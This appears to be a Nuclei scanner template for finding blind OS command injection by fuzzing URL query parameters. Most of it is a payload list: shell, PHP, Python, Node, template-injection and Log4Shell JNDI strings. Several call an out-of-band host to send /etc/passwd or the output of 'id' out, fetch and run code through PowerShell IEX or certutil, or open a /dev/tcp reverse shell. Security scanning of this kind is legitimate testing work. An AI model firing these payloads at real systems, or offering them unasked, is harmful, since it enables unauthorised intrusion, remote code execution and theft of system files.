id: blind-os-command-injection

info:
  name: Blind OS Command Injection
  author: chippa vijay kumar
  severity: high
  description: |
    OS Commanding is the direct result of mixing trusted code and untrusted data.
    This attack is possible when an application accepts untrusted input to build operating system commands in an insecure manner involving improper data sanitization,
    and/or improper calling of external programs.
  reference:
    - https://portswigger.net/research/hunting-asynchronous-vulnerabilities
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
  tags: cmdi, oast, dast, blind, polyglot

variables:
  marker: "{{interactsh-url}}"
  cmdpayload: "curl http://{{interactsh-url}}"
  cmdpayload_b64: "{{base64(cmdpayload)}}"

requests:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      interaction:
        # DNS / OAST callbacks & basic command executions
        - "1;nslookup${IFS}{{marker}};#"
        - "%0anslookup%20{{marker}}%0a"
        - "`nslookup {{marker}}`"
        - "nslookup {{marker}}"
        - "<?php+system('id');?>"
        - "ping -i {{marker}}"
        - "curl{{IFS}}http://{{marker}}"
        - "curl -s http://{{marker}}"
        - "wget http://{{marker}}"
        - "wget -qO- http://{{marker}}"
        - "nc -z {{marker}} 80"
        - "curl${IFS}{{marker}}?$(id)"
        - "echo${IFS}{{cmdpayload_b64}}|base64${IFS}-d|bash"
        - "`/bin/sh -c 'curl http://{{marker}}'`"
        - ";/bin/sh -c 'curl http://{{marker}}' ;"
        - "|| /bin/bash -c 'wget http://{{marker}}' ||"
        - "$(python -c 'import os; os.system(\"curl http://{{marker}}\")')"
        - "$(php -r 'file_get_contents(\"http://{{marker}}\");')"
        - "$(php -r 'file_get_contents(\"{{interactsh-url}}\");')"
        - "$(python -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"{{marker}}\",80))')"
        - "`/usr/bin/perl -e 'use Socket;`' || nslookup {{marker}} ||"
        - "`/bin/sh -i >& /dev/tcp/{{marker}}/80 0>&1`" # advanced â€” use cautiously

        # Common shell commands for discovery (unix)
        - "1;system('id')"
        - "{${system("cat+/etc/passwd")}}"
        - "test`id`"
        - "test`cat /etc/passwd`"
        - "test$(cat /etc/passwd)"
        - "eval('__import__(\"os\").popen(\"id\").read()')"
        - "__import__('os').popen('cat /etc/passwd').read()"
        - "'.print((`id`)).'"

        # Python / Ruby / Java / templating / unsafe eval style payloads
        - "eval('id')"
        - "eval('__import__(\"os\").popen(\"cat /etc/passwd\").read()')"
        - "[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()"
        - "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
        - "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"

        # Node / JS
        - "require('child_process').execSync('id').toString()"
        - "global.process.mainModule.require('child_process').execSync('id')"

        # Java / JNDI variants
        - "${jndi:ldap://x${hostName}.L4J.{{interactsh-url}}/a}"
        - "${jndi:ldap://{{interactsh-url}}/a}"
        - "${jndi:rmi://{{interactsh-url}}/a}"
        - "${jndi:dns://{{interactsh-url}}/a}"
        - "${${lower:j}ndi:ldap://{{interactsh-url}}/a}"

        # CGI / PHP / templating / other injection styles
        - "phpinfo();system('id');"
        - "<%=`id`%>"
        - "'); system('curl http://{{marker}}');//"
        - "${\"\" .getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")}"

        # Serialized / obfuscated / tricky polyglot forms
        - "/*$(nslookup {{marker}})`nslookup {{marker}}``*/"
        - "`curl -n 10 {{marker}}`"
        - "| curl -d @/etc/passwd {{interactsh-url}}"
        - "| curl -d @/etc/passwd http://{{marker}}"
        - "'; /usr/bin/id\n"
        - "%0A/usr/bin/id%0A"
        - "%0Aid%0A"
        - "aaa%20%7C%7C%20id%3B%20x"
        - "; powershell IEX((New-Object Net.WebClient).DownloadString('{{interactsh-url}}'))"
        - "& certutil -urlcache -split -f {{interactsh-url}}"
        - "| powershell -c Invoke-WebRequest -Uri {{interactsh-url}}"

        # Misc useful: read local files and exfil variants
        - "test|cat /etc/passwd|"
        - "test| head -n 1 /etc/passwd"
        - "|| wget -qO- http://{{marker}} || true"
        - "| /bin/sh -c 'echo $(id) | curl -d @- http://{{marker}}'"

    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{interaction}}"

    stop-at-first-match: true

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"

      - type: regex
        part: body
        regex:
          - 'root:.*:0:0:'
          - 'uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'
